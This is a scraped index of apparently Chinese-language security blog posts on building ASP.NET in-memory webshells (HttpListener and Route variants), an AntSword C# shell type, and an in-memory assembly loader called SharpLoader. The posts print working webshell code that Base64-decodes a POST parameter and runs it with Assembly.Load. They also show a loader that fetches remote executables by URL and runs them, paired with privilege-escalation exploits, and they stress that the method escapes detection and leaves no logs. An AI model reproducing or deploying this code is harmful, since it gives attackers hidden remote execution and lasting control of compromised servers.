之所以说这种方式比较特殊是因为这种方式相当于重新起了一个全新的Web。有点类似于，攻击者打进去服务器后，给目标装了一个DVWA。并且这种内存马必须要System权限才能启动。主要用于权限的维持。优点在于可以端口复用，并且因为是攻击者启动的Server所以不会在原有的Web中留下日志。 这种利用方式最早应该是出现在头像哥Exchange的exp里https://github.com/zcgonvh/CVE-2020-17144，后来Hiding师傅在文章中对其进行详细的解释，并且实现了哥斯拉可以连接的Demo：https://github.com/A-D-Team/SharpMemshell/tree/main/HttpListener ","date":"2022-05-04","objectID":"/posts/asp-net-memory-shell-httplistener/:2:0","series":null,"tags":[],"title":"ASP.NET下的内存马(三)：HttpListener内存马","uri":"/posts/asp-net-memory-shell-httplistener/#关于httplistener"},{"categories":["技术文章"],"content":"\r3 基本使用以下是微软官方文档给出的样例，其中主要的部分在代码中已经注释 // This example requires the System and System.Net namespaces. public static void SimpleListenerExample(string[] prefixes) { if (!HttpListener.IsSupported)//判断是否支持HttpListener类型 { Console.WriteLine (\"Windows XP SP2 or Server 2003 is required to use the HttpListener class.\"); return; } // URI prefixes are required, // for example \"http://contoso.com:8080/index/\". if (prefixes == null || prefixes.Length == 0)//判断URL格式是否正确 throw new ArgumentException(\"prefixes\"); // 创建一个HttpListener对象 HttpListener listener = new HttpListener(); // Add the prefixes. foreach (string s in prefixes) { listener.Prefixes.Add(s); } listener.Start(); Console.WriteLine(\"Listening...\"); // 从上下文中获取Request，Response对象 HttpListenerContext context = listener.GetContext(); HttpListenerRequest request = context.Request; // Obtain a response object. HttpListenerResponse response = context.Response; // 设置返回的信息 string responseString = \"\u003cHTML\u003e\u003cBODY\u003e Hello world!\u003c/BODY\u003e\u003c/HTML\u003e\"; byte[] buffer = System.Text.Encoding.UTF8.GetBytes(responseString); // 写入到输出流中 response.ContentLength64 = buffer.Length; System.IO.Stream output = response.OutputStream; output.Write(buffer,0,buffer.Length); // You must close the output stream. output.Close(); listener.Stop(); } 按照官方的代码样例来分析 判断是否支持HttpListener 创建HttpListener对象 添加URL路径 调用HttpListener.Start()启动Server Listener.GetContext()获取上下文Context，并编写自己的处理逻辑 调用Listener.Stop()停止Server 具体的使用场景以及方式Hiding在文章中已经写的非常清楚了，本文主要讲一讲蚁剑武器化过程中遇到的各种坑。 ","date":"2022-05-04","objectID":"/posts/asp-net-memory-shell-httplistener/:3:0","series":null,"tags":[],"title":"ASP.NET下的内存马(三)：HttpListener内存马","uri":"/posts/asp-net-memory-shell-httplistener/#基本使用"},{"categories":["技术文章"],"content":"\r4 武器化踩坑","date":"2022-05-04","objectID":"/posts/asp-net-memory-shell-httplistener/:4:0","series":null,"tags":[],"title":"ASP.NET下的内存马(三)：HttpListener内存马","uri":"/posts/asp-net-memory-shell-httplistener/#武器化踩坑"},{"categories":["技术文章"],"content":"\r4.1 入口参数问题在蚁剑C#类型的设计之初定义了三种入口参数，用于获取当前上下文的Request跟Response System.Web.HttpContext对象 包含System.Web.Request与System.Web.Response对象的数组 自动通过HttpContext.Current来拿到当前的Context System.Net.HttpListenerContext跟System.Web.HttpContext长得有点像，但其实是两个八竿子打不着的东西，无法直接转换，或者从一个中提取出另一个。 同样Listener中的Request是System.Net.HttpListenerRequest，属于不一样的实现。查看文档后发现，Listener的Request非常的原始，很多方法都没有，并不像Router内存马一样把System.Web.Request包了一层。所以也是没有办法直接转换的。 HttpListener实际上相当于新启动了一个进程，在里面调用HttpContext.Current的结果会是一个null，所以自动化提取Context也不太行。 Hiding师傅在他的文章里面给出了一种解决办法：通过提取HttpListenerRequest，HttpListenerResponse的参数来构造一个我们可以用的System.Web.Request跟System.Web.Response对象，然后作为参数实例化一个System.Web.HttpContext。 具体代码实现如下： HttpListenerContext context = listener.GetContext(); HttpListenerRequest request = context.Request; HttpListenerResponse response = context.Response; ... HttpRequest req = new HttpRequest(\"\", request.Url.ToString(), request.QueryString.ToString()); System.IO.StreamWriter writer = new System.IO.StreamWriter(response.OutputStream); HttpResponse resp = new HttpResponse(writer); HttpContext httpContext = new HttpContext(req, resp); 看起来没问题了，文章中的代码用哥斯拉也可以正常连接，但是实际上这里构造出来的req并不是一个完整的HttpRequest，为下面的坑埋下了伏笔。 ","date":"2022-05-04","objectID":"/posts/asp-net-memory-shell-httplistener/:4:1","series":null,"tags":[],"title":"ASP.NET下的内存马(三)：HttpListener内存马","uri":"/posts/asp-net-memory-shell-httplistener/#入口参数问题"},{"categories":["技术文章"],"content":"\r4.2 蚁剑获取网站根路径的问题最开始改了一版代码后一直无法连接，查看代码发现当时蚁剑在获取基本信息的时候使用的是HttpContext.Current.Server.MapPath(\"/\")来获取根路径，在exe中HttpContext.Current为空，所以这句就会报一个空指针错误。修改为AppDomain.CurrentDomain.BaseDirectory即可。 ","date":"2022-05-04","objectID":"/posts/asp-net-memory-shell-httplistener/:4:2","series":null,"tags":[],"title":"ASP.NET下的内存马(三)：HttpListener内存马","uri":"/posts/asp-net-memory-shell-httplistener/#蚁剑获取网站根路径的问题"},{"categories":["技术文章"],"content":"\r4.3 Request无法获取POST参数的问题这个点当时也被坑了很久，修了上面的问题之后测试连接提示正常，但是打开路径会返回空指针错误。 以为是路径模块写的有问题，结果发现cmd也不能用，数据库也不能用。但是确实基本信息是可以获取到的，非常奇怪。 由于Listener马必须要在System权限下运行，Rider用管理员权限打开后还是无法调试，所以就采用了一个笨办法：编译成exe-\u003e管理员打开-\u003eConsole.WriteLine打印信息。。。 由于蚁剑的Payload也都是assembly的形式打进去的，不能直接调试，还是用打印的办法调试。。。总之调试的过程就是非常恶心。。。 甚至写了一个弹计算器的demo，发现还是可以正常运行，但是一放到蚁剑中的Payload就是不能跑。 public string calc() { Process p = new Process(); p.StartInfo.FileName = \"cmd.exe\"; p.StartInfo.Arguments = \"/c \" + \"calc\"; p.StartInfo.UseShellExecute = false; p.StartInfo.RedirectStandardOutput = true; p.StartInfo.RedirectStandardError = true; p.Start(); return \"success\"; } 最后终于让我发现了一个规律：只要涉及到需要第三方参数的就会报空指针错误，硬编码Payload可以正常运行。 以打开目录为例，在exe中加了这样一句调试语句，同时burp重放蚁剑的Payload： if (req.Form[\"path\"] != null) { Console.WriteLine(\"path is not null\"); } else { Console.WriteLine(\"path is null\"); } 果然，提示收到的path参数为空 为什么会这样呢？猜测可能是构造出来的Request对象有问题，就去翻了一下Request的源码，看Form属性是如何初始化以及工作的。 public NameValueCollection Form { get { this.EnsureForm();//主要逻辑 if (this._flags[2]) { this._flags.Clear(2); this.ValidateHttpValueCollection(this._form, RequestValidationSource.Form); } return (NameValueCollection) this._form; } } 看EnsureForm() internal HttpValueCollection EnsureForm() { if (this._form == null)//判断_form是否为空 { this._form = new HttpValueCollection();//如果为空则new一个HttpValueCollection if (this._wr != null)//判断this._wr是否为null this.FillInFormCollection();//如果不是null则调用FillInFormCollection方法 this._form.MakeReadOnly();//否则MakeReadOnly } return this._form; } 查看FillInFormCollection()，主要功能就是读取input输入流，然后解析为一个一个键值对赋值给this._form。同样前面也有一个this._wr 是否为null的判断 private void FillInFormCollection() { if (this._wr == null || !this._wr.HasEntityBody()) return; string contentType = this.ContentType; if (contentType == null || this._readEntityBodyMode == ReadEntityBodyMode.Bufferless) return; if (StringUtil.StringStartsWithIgnoreCase(contentType, \"application/x-www-form-urlencoded\")) {//application/x-www-form-urlencoded 分析 byte[] bytes = (byte[]) null; HttpRawUploadedContent entireRawContent = this.GetEntireRawContent(); if (entireRawContent != null) bytes = entireRawContent.GetAsByteArray(); if (bytes == null) return; try {//处理键值对的主要函数 this._form.FillFromEncodedBytes(bytes, this.ContentEncoding); } catch (Exception ex) { throw new HttpException(SR.GetString(\"Invalid_urlencoded_form_data\"), ex); } } else {//multipart/form-data 数据流分析 if (!StringUtil.StringStartsWithIgnoreCase(contentType, \"multipart/form-data\")) return; MultipartContentElement[] multipartContent = this.GetMultipartContent(); if (multipartContent == null) return; for (int index = 0; index \u003c multipartContent.Length; ++index) { if (multipartContent[index].IsFormItem) { this._form.ThrowIfMaxHttpCollectionKeysExceeded(); this._form.Add(multipartContent[index].Name, multipartContent[index].GetAsString(this.ContentEncoding)); } } } } 那么我们是哪一步导致form没有成功构造呢，前面我们可以看到构造过程中多次对this._wr成员进行是否为空的判断。问题也就出在这里。 HttpRequest总共有三个构造函数，其中第二个public HttpRequest(string filename, string url, string queryString)是Hiding师傅使用的，也是唯一一个可以直接public调用的构造函数。但是在第二个第三个构造函数中，都会默认把this._wr赋值为null，所以也就无法走到BuildForm的过程中。 internal HttpRequest(HttpWorkerRequest wr, HttpContext context) { this._wr = wr; this._context = context; } public HttpRequest(string filename, string url, string queryString) { this._wr = (HttpWorkerRequest) null; this._pathTranslated = filename; this._httpMethod = \"GET\"; this._url = new Uri(url); this._path = VirtualPath.CreateAbsolute(this._url.AbsolutePath); this._queryStringText = queryString; this._queryStringOverriden = true; this._queryString = new HttpValueCollection(this._queryStringText, true, true, Encoding.Default); PerfCounters.IncrementCounter(AppPerfCounter.REQUESTS_EXECUTING); } internal HttpRequest(VirtualPath virtualPath, string queryString) { this._wr = (HttpWorkerRequest) null; this._pathTranslated = virtualPath.MapPath(); this._httpMethod = \"GET\"; this._url = new Uri(\"http://localhost\" + virtualPath.VirtualPathString); this._path = virtualPath; this._queryStringText = qu","date":"2022-05-04","objectID":"/posts/asp-net-memory-shell-httplistener/:4:3","series":null,"tags":[],"title":"ASP.NET下的内存马(三)：HttpListener内存马","uri":"/posts/asp-net-memory-shell-httplistener/#request无法获取post参数的问题"},{"categories":["技术文章"],"content":"\r5 核心代码Talk is cheap, show me your code. 核心代码如下： HttpListenerContext context = listener.GetContext(); HttpListenerRequest request = context.Request; HttpListenerResponse response = context.Response; SetRespHeader(response); Stream stm = null; HttpContext httpContext; try { string data = new StreamReader(request.InputStream, request.ContentEncoding).ReadToEnd(); byte[] rawData = System.Text.Encoding.Default.GetBytes(data); HttpRequest req = new HttpRequest(\"\", request.Url.ToString(), request.QueryString.ToString()); FieldInfo field = req.GetType().GetField(\"_form\", BindingFlags.Instance | BindingFlags.NonPublic); Type formtype = field.FieldType; MethodInfo method = formtype.GetMethod(\"FillFromEncodedBytes\", BindingFlags.Instance | BindingFlags.NonPublic); ConstructorInfo constructor = formtype.GetConstructor(BindingFlags.NonPublic | BindingFlags.Instance, null, new Type[0], null); object obj = constructor.Invoke(null); method.Invoke(obj, new object[] { rawData, request.ContentEncoding }); field.SetValue(req, obj); System.IO.StreamWriter writer = new System.IO.StreamWriter(response.OutputStream); HttpResponse resp = new HttpResponse(writer); httpContext = new HttpContext(req, resp); if (req.Form[\"ant\"] != null) { System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(req.Form[\"ant\"])); assembly.CreateInstance(assembly.GetName().Name + \".Run\").Equals(httpContext); httpContext.Response.End(); //Console.WriteLine(\"filter end\"); } else { response.StatusCode = 404; response.ContentLength64 = not_found.Length; stm = response.OutputStream; stm.Write(not_found, 0, not_found.Length); } } ","date":"2022-05-04","objectID":"/posts/asp-net-memory-shell-httplistener/:5:0","series":null,"tags":[],"title":"ASP.NET下的内存马(三)：HttpListener内存马","uri":"/posts/asp-net-memory-shell-httplistener/#核心代码"},{"categories":["技术文章"],"content":"\r6 测试修改Prefix为自定义路径，启动exe 测试连接成功 查看debug日志，能够正确获取到path参数 成功进入路径，其他操作也是可以正常执行的 ","date":"2022-05-04","objectID":"/posts/asp-net-memory-shell-httplistener/:6:0","series":null,"tags":[],"title":"ASP.NET下的内存马(三)：HttpListener内存马","uri":"/posts/asp-net-memory-shell-httplistener/#测试"},{"categories":["技术文章"],"content":"\r7 参考链接https://docs.microsoft.com/zh-cn/dotnet/api/system.net.httplistenerrequest?view=netframework-3.0 https://docs.microsoft.com/zh-cn/dotnet/api/system.web.httprequest?view=netframework-4.8 https://mp.weixin.qq.com/s/zsPPkhCZ8mhiFZ8sAohw6w http://yzddmr6.com/posts/%E8%81%8A%E8%81%8A%E6%96%B0%E7%B1%BB%E5%9E%8BASPXCSharp/ ","date":"2022-05-04","objectID":"/posts/asp-net-memory-shell-httplistener/:7:0","series":null,"tags":[],"title":"ASP.NET下的内存马(三)：HttpListener内存马","uri":"/posts/asp-net-memory-shell-httplistener/#参考链接"},{"categories":["技术文章"],"content":"\r1 前言最近给As-Exploits增加了一个新的模块：SharpLoader。该模块可以从内存中加载任意的assembly程序集，有点类似Cobalt Strike的execute-assembly功能。但是不同的是：cs是进程层面，用的是CLR方式，而WebShell本来就处于C#的进程中，可以调用原生的assembly加载。CLR方式加载C#整个过程都需要用到dll注入，防守方可以根据这一特点对dll反射等进行监控拦截。而在C#中调用原生的assembly加载跟普通的行为并无区别，更难以检测。 ","date":"2022-03-06","objectID":"/posts/as-exploits-sharploader/:1:0","series":null,"tags":[],"title":"讲讲As-Exploits新模块SharpLoader","uri":"/posts/as-exploits-sharploader/#前言"},{"categories":["技术文章"],"content":"\r2 核心思路其实仅加载assembly并不难，核心就是调用Assembly.Load。以SharpCradle为例，其核心代码如下： public static void loadAssembly(byte[] bin, object[] commands) { Assembly a = Assembly.Load(bin); try { a.EntryPoint.Invoke(null, new object[] { commands }); } catch { MethodInfo method = a.EntryPoint; if (method != null) { object o = a.CreateInstance(method.Name); method.Invoke(o, null); } }//End try/catch }//End loadAssembly 难的是加载任意的assembly后如何拿到回显。因为一般C#的各种后渗透工具都是在控制台输出结果，没有办法直接回显到Web。 在哥斯拉中有很多内置的C#模块，但是都是开发者在原版的基础上经过二次改造才内置到了工具里面去，其中主要改造的就是回显部分。当时自己就在想，是否能够找到一种通用的方法，能够去任意的加载各种C#写的payload，而不需要二次开发呢。 研究了一下后搞了个骚操作：我们可以在程序执行的时候把输出流重定向到一个MemoryStream里，程序执行完了再还原回去。 经过改造后的核心代码如下： //重定向输出 TextWriter tmp = Console.Out; MemoryStream memoryStream = new MemoryStream(); StreamWriter sw = new StreamWriter(memoryStream); Console.SetOut(sw); try { a.EntryPoint.Invoke(null, new object[] { commands }); } catch { MethodInfo method = a.EntryPoint; if (method != null) { object o = a.CreateInstance(method.Name); method.Invoke(o, new object[] { commands }); } } finally { //增加延时，保证所有输出都进入缓冲区 System.Threading.Thread.Sleep(2000); sw.Close(); Console.SetOut(tmp); } ","date":"2022-03-06","objectID":"/posts/as-exploits-sharploader/:2:0","series":null,"tags":[],"title":"讲讲As-Exploits新模块SharpLoader","uri":"/posts/as-exploits-sharploader/#核心思路"},{"categories":["技术文章"],"content":"\r3 第一次尝试先搞个demo试一下，新建一个测试项目TestRun，这里直接远程获取exe并且加载。 public static void SharpLoaderTest() { var run = new SharpLoader.Run(); run.cs = \"UTF-8\"; string result = run.loadAssemblyByUrl(\"http://localhost:7777/TestFunc.exe\", \"cmd /c whoami\"); Console.WriteLine(result); } 其中TestFunc的内容如下： using System; using System.Diagnostics; namespace TestFunc { internal class Program { public static void Main(string[] args) { foreach (var arg in args) { Console.WriteLine(\"arg: \" + arg); } Process.Start(\"calc.exe\"); } } } 测试后发现可以读取到各个参数，并且成功获取了Output的内容。 搞到插件里看看？ 插件里也是可以的，换成头像哥的原版efspotato试试 测试内存加载，成功执行命令 URL远程加载成功执行命令 成功！ ","date":"2022-03-06","objectID":"/posts/as-exploits-sharploader/:3:0","series":null,"tags":[],"title":"讲讲As-Exploits新模块SharpLoader","uri":"/posts/as-exploits-sharploader/#第一次尝试"},{"categories":["技术文章"],"content":"\r4 进一步优化现在已经可以做到加载任意的.net二进制文件并且拿到回显了，但是在后续测试的过程中发现了一些问题。 在执行带有空格的命令的时候，不能获取预期的结果。 看了下源码，是因为我们的命令行参数在被用空格切割以后，被当作了不同的参数。 预期情况： efspotato.exe cmd -\u003eargs[0] -\u003enet user pipe -\u003eargs[1] 现在的情况： efspotato.exe net -\u003eargs[0] user -\u003eargs[1] 在命令行中可以通过引号来解决某个参数中有空格的问题，但是毕竟咱们不是在命令行环境下执行的 改进之后，单个参数的空格中以{*}来作为占位符，最后统一替换掉。 string[] commands = command.Split(' '); for (int i = 0; i \u003c commands.Length; i++) { //特殊标记替换为空格 commands[i] = commands[i].Replace(\"{*}\", \" \"); } 改进过后我们就可以成功执行net user命令了 ","date":"2022-03-06","objectID":"/posts/as-exploits-sharploader/:4:0","series":null,"tags":[],"title":"讲讲As-Exploits新模块SharpLoader","uri":"/posts/as-exploits-sharploader/#进一步优化"},{"categories":["技术文章"],"content":"\r5 继续优化看起来差不多了，但其实还是有优化空间的：assembly在首次加载之后，我们只需要将其保存在上下文中，后续通过反射调用即可，这样无需每次都传递一个assembly过去，流量特征就可以大大减小，在网络环境不好的场景下也非常有用处。 最终版本的界面如下： ","date":"2022-03-06","objectID":"/posts/as-exploits-sharploader/:5:0","series":null,"tags":[],"title":"讲讲As-Exploits新模块SharpLoader","uri":"/posts/as-exploits-sharploader/#继续优化"},{"categories":["技术文章"],"content":"\r6 测试以Efspotato为例 ","date":"2022-03-06","objectID":"/posts/as-exploits-sharploader/:6:0","series":null,"tags":[],"title":"讲讲As-Exploits新模块SharpLoader","uri":"/posts/as-exploits-sharploader/#测试"},{"categories":["技术文章"],"content":"\r6.1 内存加载选择我们要加载的本地文件即可 ","date":"2022-03-06","objectID":"/posts/as-exploits-sharploader/:6:1","series":null,"tags":[],"title":"讲讲As-Exploits新模块SharpLoader","uri":"/posts/as-exploits-sharploader/#内存加载"},{"categories":["技术文章"],"content":"\r6.2 URL加载把exp托管到一个web上，然后填写远程URl地址 需要注意的是，这里有一个坑。 本来想着可以直接去加载https://github.com/Flangvik/SharpCollection上面各种编译好的payload，但是发现.net 4好像不支持tls1.2??? https://stackoverflow.com/questions/47269609/system-net-securityprotocoltype-tls12-definition-not-found 那还是自己搭个http的服务吧 ","date":"2022-03-06","objectID":"/posts/as-exploits-sharploader/:6:2","series":null,"tags":[],"title":"讲讲As-Exploits新模块SharpLoader","uri":"/posts/as-exploits-sharploader/#url加载"},{"categories":["技术文章"],"content":"\r6.3 通过名称加载在前面通过内存或者URL加载过的程序集，后续都可以通过项目名来反射加载。 可以先通过 获取已加载的Assembly 功能来获取之前所有打进去过的项目名，多个结果以|分割 填入你想要反射的Assembly的名称，加上要执行的参数，exploit！ 成功调用目标程序集 ","date":"2022-03-06","objectID":"/posts/as-exploits-sharploader/:6:3","series":null,"tags":[],"title":"讲讲As-Exploits新模块SharpLoader","uri":"/posts/as-exploits-sharploader/#通过名称加载"},{"categories":["技术文章"],"content":"\r7 最后虽然能够加载任意程序集了，但是很多Payload还是必须要在高权限下面才可以运行，比如说SharpMiniDump ，SharpKatz等，这部分我还没有想好怎么去借助WebShell来实现无文件利用。可能这个模块最大的用处还是用来加载各种提权的exp，不用再做文件层面的免杀了。 As-Exploits 1.5版本还有一些模块的重写没有完成，发布时间待定。说实话我也不知道到底有没有人用，工具也是瞎写写，用起来不顺手欢迎私下跟我提意见交流。 ","date":"2022-03-06","objectID":"/posts/as-exploits-sharploader/:7:0","series":null,"tags":[],"title":"讲讲As-Exploits新模块SharpLoader","uri":"/posts/as-exploits-sharploader/#最后"},{"categories":["技术文章"],"content":"\r8 参考https://github.com/anthemtotheego/SharpCradle https://docs.microsoft.com/zh-cn/dotnet/api/system.console.setout?view=net-6.0 https://github.com/zcgonvh/EfsPotato (https://stackoverflow.com/questions/47269609/system-net-securityprotocoltype-tls12-definition-not-found ","date":"2022-03-06","objectID":"/posts/as-exploits-sharploader/:8:0","series":null,"tags":[],"title":"讲讲As-Exploits新模块SharpLoader","uri":"/posts/as-exploits-sharploader/#参考"},{"categories":["技术文章"],"content":"\r1 前言最近花了点时间，给蚁剑加上了C#的shell类型。 其实蚁剑在实现jscript加载assembly之后，jscript已经可以实现所有C#可以实现的功能：http://yzddmr6.com/posts/jscript-load-csharp-assembly/ 这次增加主要是有几点考虑： Jscript的shell出现很容易被杀。我还没有见过用jscript写的项目，web目录下面出现了Jscript文件99.99%就是webshell，特征更明显一些。 Jscript的语法属实恶心。没有啥文档，坑全部靠踩。 C#类型可以兼容asp.net 各种内存马，Jscript无法做到。 本文记录一下自己在开发设计的过程中，遇到的一些问题以及自己的思考。 ","date":"2022-01-13","objectID":"/posts/new-type-aspxcsharp/:1:0","series":null,"tags":[],"title":"聊聊新类型ASPXCSharp","uri":"/posts/new-type-aspxcsharp/#前言"},{"categories":["技术文章"],"content":"\r2 自定义类名其实一开始遇到的问题是无法自定义类名的问题。c#跟java有一点不同的是，java的newInstance是不需要指定type的，只要有Class对象就可以实例化。但是c#在实例化的时候必须要指定实例化的type，这也意味着我们所有的全限定类名必须要一样。 冰蝎默认类名都是U，就建在根命名空间下。每个payload是单独编译的。 哥斯拉同样采用了这种机制，实例化的类名是LY。但是因为哥斯拉采用的方式是一次性把payload都打到内存里然后反射调用，所以可以把所有的基础payload都编译到一个dll里面。 但是这样开发Payload的时候会很难受，因为在同一个项目下面都用一个固定的类名，编译器是会报冲突的。 后来想到了一种取巧的办法，用python命令行调用编译程序，在编译之前把类名都统一替换掉。暂时解决了问题，但是还是感觉不够优雅。 那么有没有什么办法可以动态获取到assembly的type呢？ 翻了翻手册，发现以下方法 GetType() 获取当前实例的 Type。(继承自 Object) GetTypes() 获取此程序集中定义的类型。 GetName() 获取此程序集的 AssemblyName。 写代码测试一下 String Payload = \"xxx\"; System.Reflection.Assembly a = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)); Console.WriteLine(\"Assembly.GetName: \"+a.GetName()); Console.WriteLine(\"Assembly.GetName.Name: \"+a.GetName().Name); Console.WriteLine(\"Assembly.GetType: \"+a.GetType()); Console.WriteLine(\"Assembly.GetTypes[0]: \"+a.GetTypes()[0]); Console.WriteLine(\"Assembly.GetTypes[0].FullName: \"+a.GetTypes()[0].FullName); output Assembly.GetName: BASE_Info, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null Assembly.GetName.Name: BASE_Info Assembly.GetType: System.Reflection.Assembly Assembly.GetTypes[0]: BASE_Info.Run Assembly.GetTypes[0].FullName: BASE_Info.Run Assembly.GetTypes返回的是一个列表，而payload里面我们通常只会定义一个类，所以可以通过Assembly.GetTypes[0]来获取payload类的type。 webshell中可以采用如下写法。 \u003c%@ Page Language=\"c#\"%\u003e \u003c% String Payload = Request.Form[\"ant\"]; if (Payload != null) { System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)); assembly.CreateInstance(assembly.GetTypes()[0].FullName).Equals(Context); } %\u003e 这里又跟java的defineClass不太一样，defineClass只能打进去一个类，而c#的Assembly.Load可以加载一个程序集，并不一定只是一个类。所以为了考虑今后payload里可能会有多个类的情况，推荐的写法如下： \u003c%@ Page Language=\"c#\"%\u003e \u003c% String Payload = Request.Form[\"ant\"]; if (Payload != null) { System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)); assembly.CreateInstance(assembly.GetName().Name + \".Run\").Equals(Context); } %\u003e 即强行指定实例化的类为命名空间下名为Run的类。 ","date":"2022-01-13","objectID":"/posts/new-type-aspxcsharp/:2:0","series":null,"tags":[],"title":"聊聊新类型ASPXCSharp","uri":"/posts/new-type-aspxcsharp/#自定义类名"},{"categories":["技术文章"],"content":"\r3 兼容内存马rebeyond大佬在最开始用加载assembly作为aspx类型的shell时，默认Equals里面是this对象。也就是Page对象。这种方式在aspx文件落地的情况下没有毛病，但是在内存马环境下，是没有Page对象的，这种办法也就不兼容。 微软文档如下图 哥斯拉则对此进行了兼容处理，不再采用Page对象，而采用了兼容性更好的HttpContext 其实入口参数的本质就是获取到当前的request跟response对象。 吸取了jsp的经验，一开始parseObj函数内置了三种方法： public void parseObj(Object obj) { if (obj.GetType().IsArray)//直接数组传入 { Object[] data = (Object[])obj; this.Request = (HttpRequest)data[0]; this.Response = (HttpResponse)data[1]; } else { try { Page page = (Page)obj;//传入Page对象 this.Response = page.Response; this.Request = page.Request; } catch (Exception) { HttpContext context = (HttpContext)obj;//传入HttpContext对象 this.Response = context.Response; this.Request = context.Request; } } } 所以在shell中用以下写法均可连接 //利用Page对象 System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)).CreateInstance(xxx).Equals(this); //利用Context对象 System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)).CreateInstance(xxx).Equals(Context); //利用数组 System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)).CreateInstance(xxx).Equals(new object[] { Request, Response }); 以asp.net的Route内存马为例，从route上下文中获取到的Context是HttpContextBase，而不是HttpContext。具体的实现类为System.Web.HttpContextWrapper。 并且通过HttpContextWrapper.Request获取到的对象是HttpRequestBase，默认实现类是System.Web.HttpRequestWrapper。有点类似Tomcat的门面模式。 如果要采用数组的方式可以用以下反射代码实现 FieldInfo requestField = typeof(HttpRequestWrapper).GetField(\"_httpRequest\", BindingFlags.Instance | BindingFlags.NonPublic); HttpRequest httpRequest = (HttpRequest)requestField.GetValue(httpContext.Request); FieldInfo responseField = typeof(HttpResponseWrapper).GetField(\"_httpResponse\", BindingFlags.Instance | BindingFlags.NonPublic); HttpResponse httpResponse = (HttpResponse)responseField.GetValue(httpContext.Response); System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)); assembly.CreateInstance(assembly.GetName().Name + \".Run\").Equals(new object[] { httpRequest, httpResponse }); 访问注入内存马的aspx，一片空白说明注入成功 蚁剑中输入任意url，连接成功。 ","date":"2022-01-13","objectID":"/posts/new-type-aspxcsharp/:3:0","series":null,"tags":[],"title":"聊聊新类型ASPXCSharp","uri":"/posts/new-type-aspxcsharp/#兼容内存马"},{"categories":["技术文章"],"content":"\r4 进一步思考看起来不错了，但是还有继续优化的空间吗？ Java中一个比较著名的问题是内存马回显，实际上是如何从当前线程获取当前的request跟response对象。这个问题其实比较蛋疼，因为不同的容器有不同的实现细节，无法统一处理。 但是C#则直接把这个接口给暴露了出来，直接可以通过HttpContext.Current获取到当前的context，从而获取当前的request跟response对象。 再次改造之后，payload中parseObj如下： public void parseObj(Object obj) { if (obj.GetType().IsArray) { Object[] data = (Object[])obj; this.Request = (HttpRequest)data[0]; this.Response = (HttpResponse)data[1]; } else { try { HttpContext context = (HttpContext)obj; this.Response = context.Response; this.Request = context.Request; } catch (Exception) { HttpContext context = HttpContext.Current; this.Response = context.Response; this.Request = context.Request; } } } 改版后我们去掉了兼容性不强的Page方式，如果数组方式跟Context都无法获取的话，就尝试通过HttpContext.Current来拿到当前的Context。 所以其实在shell中直接Equals(null)，或者一个随意对象即可。 \u003c%@ Page Language=\"c#\"%\u003e \u003c% String Payload = Request.Form[\"ant\"]; if (Payload != null) { System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)); assembly.CreateInstance(assembly.GetName().Name + \".Run\").Equals(null); } %\u003e 同样可以连接成功 至于为什么没有把原来的入口参数方式全部都去掉，是因为新类型并没有在实战环境中测试过。不知道会不会有一些特殊情况。为了谨慎起见，还是保留了原来的入口参数。 ","date":"2022-01-13","objectID":"/posts/new-type-aspxcsharp/:4:0","series":null,"tags":[],"title":"聊聊新类型ASPXCSharp","uri":"/posts/new-type-aspxcsharp/#进一步思考"},{"categories":["技术文章"],"content":"\r5 最后个人喜欢开发一些工具，同时记录下自己的碎碎念。如果能对你有帮助，那就最好不过了。 github地址：https://github.com/AntSwordProject/antSword/commit/d2d848c89e03088c20cc31f411e73fe2dd2973ea ","date":"2022-01-13","objectID":"/posts/new-type-aspxcsharp/:5:0","series":null,"tags":[],"title":"聊聊新类型ASPXCSharp","uri":"/posts/new-type-aspxcsharp/#最后"},{"categories":["技术文章"],"content":" 本文首发于ASP.NET下的内存马(2) Route内存马 - 跳跳糖 (tttang.com) ","date":"2021-12-26","objectID":"/posts/asp-net-memory-shell-router/:0:0","series":null,"tags":[],"title":"ASP.NET下的内存马(二)：Route内存马的N种写法","uri":"/posts/asp-net-memory-shell-router/#"},{"categories":["技术文章"],"content":"\r1 前言asp.net下的内存马研究文章比较少，目前提到过的包括虚拟路径内存马以及HttpListener内存马。最近研究了一下其他类型的内存马，发现.net可以利用的地方要多得多。所以准备写个系列文章，讲一讲asp.net下的内存马。 文章仅作研究性质，不保证任何实战效果，请勿用于非法用途。 上篇讲了asp.net mvc下的filter内存马，必须依赖于system.web.mvc.dll这个东西，也就是只能在.net mvc下使用。那么如何仅利用.net framework里面的dll来实现新的内存马呢。这就引出了今天要讲的route内存马。 ","date":"2021-12-26","objectID":"/posts/asp-net-memory-shell-router/:1:0","series":null,"tags":[],"title":"ASP.NET下的内存马(二)：Route内存马的N种写法","uri":"/posts/asp-net-memory-shell-router/#前言"},{"categories":["技术文章"],"content":"\r2 System.Web.RoutingSystem.Web.Routing这个类最早出现在.net 3.5，主要用于在 ASP.NET 应用程序中处理路由。 微软文档介绍： Route类使你可以指定如何在 ASP.NET 应用程序中处理路由。 你 Route 为要映射到的每个 URL 模式创建一个对象，该对象可以处理与该模式对应的请求。 然后，将路由添加到 Routes 集合。 当应用程序收到请求时，ASP.NET 路由会循环访问集合中的路由， Routes 以查找第一个与 URL 模式匹配的路由。 将 Url 属性设置为 URL 模式。 URL 模式由传入 HTTP 请求中的应用程序名称后面的段组成。 例如，在 URL 中 http://www.contoso.com/products/show/beverages ，模式适用于 products/show/beverages 。 具有三个段（如）的模式 {controller}/{action}/{id} 与 URL 匹配 http://www.contoso.com/products/show/beverages 。 每个段均由 / 字符分隔。 当段括在大括号中 ({ 和 }) 时，段会被称为 URL 参数。 ASP.NET 路由从请求中检索值并将其分配给 URL 参数。 在上面的示例中，将为 URL 参数 action 分配值 show 。 如果段未括在大括号中，则该值将被视为文本值。 将 Defaults 属性设置为一个 RouteValueDictionary 对象，该对象包含在 url 缺少参数时使用的值，或者设置未在 url 中参数化的其他值。 将 Constraints 属性设置为 RouteValueDictionary 